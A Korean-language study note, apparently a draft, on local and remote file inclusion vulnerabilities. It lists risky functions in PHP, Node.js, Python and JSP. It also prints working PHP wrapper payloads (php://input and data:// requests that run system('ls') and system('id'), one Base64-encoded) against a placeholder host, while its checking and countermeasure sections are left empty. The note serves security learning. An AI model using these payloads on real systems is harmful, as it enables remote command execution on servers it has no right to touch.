# 1. 취약점 정의

웹 애플리케이션이 사용자 입력 값을 적절히 검증하지 않고 서버 내부의 파일 경로를 참조할 때 발생하는 취약점이다. 서버 내부의 파일 경로를 참조하는 것은 LFI(Local File Inclusion), 원격으로 외부 서버에 있는 파일을 참조하는 것은 RFI(Remote File Inclusion)이라고 한다.

이 취약점은 각 언어의 특정 함수를 사용했을 때 발생할 가능성이 생긴다.

- PHP : include, require, file_get_contents
- Node.js : fs.readfile, require
- Python : open
- Java(JSP) : <jsp:include page="..." /> 태그 또는 RequestDispatcher.forward

보통 PHP에서 자주 발생하는데, PHP의 include 계열 함수는 '파일 읽기 + 코드 실행'이 기본 동작이고, 타 언어는 보통 파일 읽기와 코드/모듈 호출이 엄격하게 분리되어 있기 때문이다. 그리고, PHP Wrapper 기능이 존재하여 이를 이용하여 필터링을 우회하는 경우가 발생하기 때문이다.

## PHP Wrapper



- php://input : 클라이언트가 서버로 전달하는 POST 요청의 Body 데이터 전체를 읽어오는 PHP의 내장 스트림. LFI 취약점이 발생하는 파라미터에 php://input 을 입력하고, POST 요청 시 Body에 PHP의 시스템 명령을 실행시킬 수 있는 코드(<?php system('ls')?>)를 전달하면 시스템 명령어가 실행되어 사용자에게 응답으로 반환된다.

* php://input 예시
```
POST /index.php?file=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php system('ls'); ?>
```

- data:// : data://는 별도의 파일이나 네트워크 연결 없이 데이터 자체를 Inline 형태(텍스트 또는 Base64)로 전달할 때 사용된다.

* data:// 예시
```
// 공격자의 요청 (Base64 미사용)
http://target.com/index.php?file=data://text/plain,<?php system('id'); ?>

// 공격자의 요청 (Base64 사용)
http://target.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
// 뒤의 Base64 문자열은 <?php system('id'); ?> 를 Base64 인코딩한 것이다.
```

# 2. 점검 방법

# 3. 대응 방안

# 4. 참고

- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

- https://www.php.net/manual/en/wrappers.php
